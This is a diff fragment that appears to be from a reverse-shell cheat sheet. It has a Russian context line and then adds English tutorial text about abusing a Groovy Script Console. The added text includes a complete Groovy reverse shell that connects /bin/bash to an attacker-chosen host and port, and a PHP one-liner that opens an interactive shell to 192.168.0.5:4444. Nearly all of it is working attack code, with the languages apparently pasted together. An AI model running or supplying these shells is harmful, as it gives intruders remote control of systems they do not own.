@@ -4,6 +4,20 @@
 
 Как таковые, это довольно короткие строки, но не очень читаемые.
 
+
+Script Console is a feature that accepts Groovy, a type of programming language for the Java platform. Let's jump straight in and try to establish a reverse shell using this feature! The example below is using an edited version of this script.
+
+Groovy Reverse Shell Script
+
+String host="attacking machine IP here";
+int port=6996;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+
+
+
+
 Php :
 
 php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
